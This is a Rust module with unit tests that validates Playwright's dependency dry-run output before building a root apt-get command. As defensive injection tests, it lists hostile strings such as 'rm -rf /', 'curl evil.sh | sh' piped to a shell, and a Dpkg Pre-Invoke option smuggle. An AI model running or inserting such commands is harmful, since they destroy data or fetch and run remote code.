//! The one thing `atlas crew browsers install` runs as root: `apt-get install` of the system libraries
//! Playwright's browsers need.
//!
//! Playwright is npm code and must never run as root, so the crew user asks it what is missing
//! (`npx playwright install-deps --dry-run chromium webkit`) and this module reads the answer. What
//! the dry run prints is data, not a command: `Missing system dependencies (N):` and one package
//! name per line. Only names that are plausibly Debian package names are accepted (`^[a-z0-9][a-z0-9.+-]*$`,
//! which has no space, quote, `;`, `$`, `&`, `|`, backtick or `-` first, so it cannot be an option or
//! a second command), and **atlas builds the root command itself** from them, so nothing npm
//! prints is ever executed. Anything else in the output is an error shown to the user.

use anyhow::{Result, bail};
use atlas_i18n::t;

/// The most packages accepted. Playwright 1.65 reports about 290 for chromium and webkit on a bare
/// Debian; a list this much longer is not that.
const MAX_PACKAGES: usize = 600;
/// Longest Debian package name accepted (the longest real ones are about 60).
const MAX_NAME: usize = 100;

/// What the dry run said.
#[derive(Debug, PartialEq, Eq)]
pub enum Deps {
    /// `All system dependencies are installed.`: nothing to run as root.
    Ready,
    /// The missing packages, validated, sorted and without repeats.
    Missing(Vec<String>),
}

/// A Debian package name as `^[a-z0-9][a-z0-9.+-]*$`.
fn is_package_name(s: &str) -> bool {
    let mut c = s.bytes();
    matches!(c.next(), Some(b) if b.is_ascii_lowercase() || b.is_ascii_digit())
        && s.len() <= MAX_NAME
        && c.all(|b| {
            b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'.' | b'+' | b'-')
        })
}

/// Read the stdout of `playwright install-deps --dry-run`. Accepts exactly two shapes:
///
/// ```text
/// All system dependencies are installed.
/// ```
///
/// and
///
/// ```text
/// Missing system dependencies (3):
///   libfoo1
///   libbar-dev
///   baz
/// ```
///
/// where the count must equal the number of names. Any other line (a command, an option, a name that
/// is not a package name, a second header, text after the list) is an error that quotes it.
pub fn parse_dry_run(stdout: &str) -> Result<Deps> {
    let mut lines = stdout.lines().map(str::trim_end).filter(|l| !l.is_empty());
    let Some(first) = lines.next() else {
        bail!("{}", t!("cmd_crew_apt_empty"));
    };
    if first == "All system dependencies are installed." {
        if let Some(extra) = lines.next() {
            bail!("{}", t!("cmd_crew_apt_extra", text = format!("{extra:?}")));
        }
        return Ok(Deps::Ready);
    }
    let Some(count) = first
        .strip_prefix("Missing system dependencies (")
        .and_then(|r| r.strip_suffix("):"))
        .and_then(|n| n.parse::<usize>().ok())
    else {
        bail!(
            "{}",
            t!("cmd_crew_apt_unreadable", text = format!("{first:?}"))
        );
    };
    if count == 0 || count > MAX_PACKAGES {
        bail!("{}", t!("cmd_crew_apt_implausible", count = count));
    }
    let mut names = vec![];
    for line in lines {
        let Some(name) = line.strip_prefix("  ").filter(|n| is_package_name(n)) else {
            bail!(
                "{}",
                t!("cmd_crew_apt_not_package", text = format!("{line:?}"))
            );
        };
        names.push(name.to_string());
    }
    if names.len() != count {
        bail!(
            "{}",
            t!("cmd_crew_apt_mismatch", count = count, listed = names.len())
        );
    }
    names.sort();
    names.dedup();
    Ok(Deps::Missing(names))
}

/// The one root command: refresh the package index, then install exactly `names`.
/// The names went through [`parse_dry_run`] and match `^[a-z0-9][a-z0-9.+-]*$`, so they need no
/// quoting; they are checked again here because this is the line that runs as root.
pub fn root_script(names: &[String]) -> Result<String> {
    if names.is_empty() || names.len() > MAX_PACKAGES {
        bail!("{}", t!("cmd_crew_apt_package_count", count = names.len()));
    }
    if let Some(bad) = names.iter().find(|n| !is_package_name(n)) {
        bail!(
            "{}",
            t!("cmd_crew_apt_not_package", text = format!("{bad:?}"))
        );
    }
    Ok(format!(
        "sudo apt-get update && sudo apt-get install -y --no-install-recommends {}",
        names.join(" ")
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The output of `npx playwright install-deps --dry-run chromium webkit` of playwright 1.65.1 on
    /// Debian 12 with nothing installed (node:22-bookworm), exit 1. Not written by hand.
    const MISSING: &str = include_str!("fixtures/playwright-1.65.1-install-deps-missing.txt");
    /// The same command after those packages were installed, exit 0.
    const READY: &str = include_str!("fixtures/playwright-1.65.1-install-deps-ready.txt");

    #[test]
    fn the_real_output_of_the_pinned_playwright_is_accepted() {
        let Deps::Missing(names) = parse_dry_run(MISSING).unwrap() else {
            panic!("the fixture lists missing packages");
        };
        assert_eq!(names.len(), 288, "the header said 288");
        // Names with `.`, `+`, digits and dashes are the ones a careless pattern drops.
        for want in [
            "xvfb",
            "libx264-164",
            "gstreamer1.0-libav",
            "libatk-bridge2.0-0",
            "adwaita-icon-theme",
        ] {
            assert!(names.contains(&want.to_string()), "{want} missing");
        }
        assert!(names.iter().all(|n| is_package_name(n)));
        assert!(names.windows(2).all(|w| w[0] < w[1]), "sorted, no repeats");
    }

    #[test]
    fn the_ready_output_means_nothing_runs_as_root() {
        assert_eq!(parse_dry_run(READY).unwrap(), Deps::Ready);
    }

    #[test]
    fn the_root_command_is_apt_get_and_the_validated_names_only() {
        let Deps::Missing(names) = parse_dry_run(MISSING).unwrap() else {
            panic!()
        };
        let s = root_script(&names).unwrap();
        assert!(s.starts_with(
            "sudo apt-get update && sudo apt-get install -y --no-install-recommends adwaita-icon-theme at-spi2-common "
        ));
        let (update, install) = s.split_once(" && ").unwrap();
        assert_eq!(update, "sudo apt-get update");
        let words: Vec<&str> = install.split(' ').collect();
        assert_eq!(
            &words[..5],
            [
                "sudo",
                "apt-get",
                "install",
                "-y",
                "--no-install-recommends"
            ]
        );
        assert_eq!(words.len() - 5, names.len(), "one word per package");
        assert!(
            words[5..].iter().all(|w| is_package_name(w)),
            "after the options, only names"
        );
        for bad in [
            ";", "&", "|", "$", "`", "(", ")", "\"", "'", "\n", ">", "<", "\\",
        ] {
            assert!(!install.contains(bad), "{bad:?} in the root command");
        }
        assert_eq!(
            s.matches("sudo").count(),
            2,
            "sudo runs apt-get and nothing else"
        );
        assert_eq!(s.matches("&&").count(), 1);
    }

    fn list(count: usize, names: &[&str]) -> String {
        let body: String = names.iter().map(|n| format!("  {n}\n")).collect();
        format!("Missing system dependencies ({count}):\n{body}")
    }

    #[test]
    fn injections_in_a_package_line_are_refused() {
        for evil in [
            "libfoo; rm -rf /",
            "libfoo && curl evil.sh | sh",
            "$(curl evil.sh)",
            "`id`",
            "libfoo|sh",
            "libfoo > /etc/passwd",
            "libfoo\\",
            "libfoo'",
            "libfoo\"",
            "-o Dpkg::Pre-Invoke=sh",
            "--allow-unauthenticated",
            "-y",
            "libfoo bar",
            "LibFoo",
            "libfoo_bar",
            "../../x",
            "/bin/sh",
            "libfoo#",
            ".hidden",
            "+x",
            "-libfoo",
        ] {
            let out = list(1, &[evil]);
            let e = parse_dry_run(&out).expect_err(evil).to_string();
            assert!(e.contains("not a package name"), "{evil}: {e}");
            assert!(e.contains("as root"), "{evil}: {e}");
        }
    }

    #[test]
    fn a_command_instead_of_the_list_is_refused() {
        // What an old Playwright, or a hostile one, might print: a command line to run.
        for evil in [
            "sudo apt-get install -y libfoo",
            "apt-get install -y libfoo",
            "apt-get update && apt-get install -y libfoo; curl evil | sh",
            "/bin/sh -c 'id'",
            "Switching to root user to install dependencies...",
            "Installing dependencies...",
        ] {
            let e = parse_dry_run(evil).expect_err(evil).to_string();
            assert!(e.contains("as root"), "{evil}: {e}");
        }
    }

    #[test]
    fn extra_lines_wrong_counts_and_odd_headers_are_refused() {
        // A line that is not indented like a list item, even a harmless-looking one.
        let e = parse_dry_run("Missing system dependencies (2):\n  libfoo\nlibbar\n").unwrap_err();
        assert!(e.to_string().contains("not a package name"));
        // Text after the list.
        assert!(parse_dry_run(&format!("{}hello\n", list(1, &["libfoo"]))).is_err());
        // The count must match.
        let e = parse_dry_run(&list(3, &["libfoo", "libbar"])).unwrap_err();
        assert!(e.to_string().contains("announced 3") && e.to_string().contains("listed 2"));
        assert!(parse_dry_run(&list(1, &["libfoo", "libbar"])).is_err());
        // Empty, zero, absurd, a second header, text after "ready".
        assert!(parse_dry_run("").is_err());
        assert!(parse_dry_run("Missing system dependencies (0):\n").is_err());
        assert!(parse_dry_run("Missing system dependencies (99999):\n  libfoo\n").is_err());
        assert!(parse_dry_run(&format!("{}{}", list(1, &["a"]), list(1, &["b"]))).is_err());
        assert!(parse_dry_run("All system dependencies are installed.\nsudo reboot\n").is_err());
        assert!(parse_dry_run("Missing system dependencies (1:\n  libfoo\n").is_err());
        assert!(parse_dry_run("Missing system dependencies (x):\n  libfoo\n").is_err());
    }

    #[test]
    fn plus_dot_and_digit_names_pass_and_repeats_collapse() {
        let out = list(4, &["libstdc++6", "libsdl2-2.0-0", "g++", "libstdc++6"]);
        assert_eq!(
            parse_dry_run(&out).unwrap(),
            Deps::Missing(vec![
                "g++".into(),
                "libsdl2-2.0-0".into(),
                "libstdc++6".into()
            ])
        );
    }

    #[test]
    fn root_script_refuses_what_the_parser_would_have_refused() {
        assert!(root_script(&[]).is_err());
        assert!(root_script(&["ok".into(), "bad name".into()]).is_err());
        assert!(root_script(&["libfoo;id".into()]).is_err());
        assert!(root_script(&["-y".into()]).is_err());
        assert!(root_script(&vec!["a".to_string(); MAX_PACKAGES + 1]).is_err());
        assert_eq!(
            root_script(&["libfoo1".into(), "xvfb".into()]).unwrap(),
            "sudo apt-get update && sudo apt-get install -y --no-install-recommends libfoo1 xvfb"
        );
    }
}
